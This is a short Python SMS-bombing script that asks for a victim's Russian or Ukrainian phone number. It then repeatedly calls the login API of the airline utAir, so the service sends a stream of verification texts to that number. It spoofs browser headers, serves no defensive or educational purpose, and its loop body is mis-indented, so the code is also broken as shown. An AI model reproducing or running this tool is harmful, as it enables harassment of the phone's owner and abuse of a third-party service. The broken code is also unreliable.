import threading
import time
import requests, random, datetime, sys, time, argparse, os
print ("""
╔╗──╔╗╔╗───────╔══╗╔═══╦═══╦═╗╔═╦══╗
║╚╗╔╝╠╝╚╗──────║╔╗║║╔═╗║╔═╗║║╚╝║╔╗║
╚╗║║╔╬╗╔╬╗─╔╦══╣╚╝╚╣║║║║║║║║╔╗╔╗║╚╝╚╗
─║╚╝╠╣║║║║─║║╔╗║╔═╗║║║║║║║║║║║║║║╔═╗║
─╚╗╔╣║║╚╣╚═╝║╔╗║╚═╝║╚═╝║╚═╝║║║║║║╚═╝║
──╚╝╚╝╚═╩═╗╔╩╝╚╩═══╩═══╩═══╩╝╚╝╚╩═══╝
────────╔═╝║
────────╚══╝""") 
phone = input("\033[32m Номер Бобика +")

phone = str(phone)
if (phone[0:2] == "+7" and len(phone[1:]) == 11) or (phone[0:4] == "+380" and len(phone[1:]) == 12):
    while True: 
    cl = requests.session()
    cl.get('https://b.utair.ru/api/v1/login/')
    rSL = requests.post('https://b.utair.ru/api/v1/login/', headers = {"Content-Type":"application/json", "Referer":"https://www.utair.ru/", "Sec-Fetch-Mode":"cors", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 (Edition Yx 02)"}, json={"login":phone[1:]})
    if rSL.status_code == 200: 
      print("Сообщение от сервиса utAir отправлено.") 
    else: 
      print("Сообщение от сервиса utAir не отправлено.")
    time.sleep(5) 